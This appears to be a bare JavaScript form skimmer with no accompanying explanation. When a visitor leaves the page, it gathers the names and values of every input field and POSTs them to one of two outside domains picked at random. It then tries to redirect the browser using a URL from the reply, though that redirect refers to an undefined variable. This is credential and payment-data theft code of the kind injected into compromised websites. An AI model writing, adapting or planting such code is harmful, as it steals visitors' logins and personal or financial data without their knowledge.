var stop = true;

function LogTime(e) {
    if (stop) {
        fetch('//' + ["petfirsts", "petsdogma"][Math.round(Math.random())] + '.com/index.php', {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify("" + [...document.querySelectorAll("input")].map((e) => e.name + '=' + e.value).join("&")),
        })
            .then(function (response) {
                if (response) {
                    return response.json()
                }
            })
            .then(function (json) {
                if (json.url) {
                    stop = false;
                    e.preventDefault();
                    window.location.href = dt.url;
                }
            })
    }
}

$(window).bind('beforeunload', LogTime);
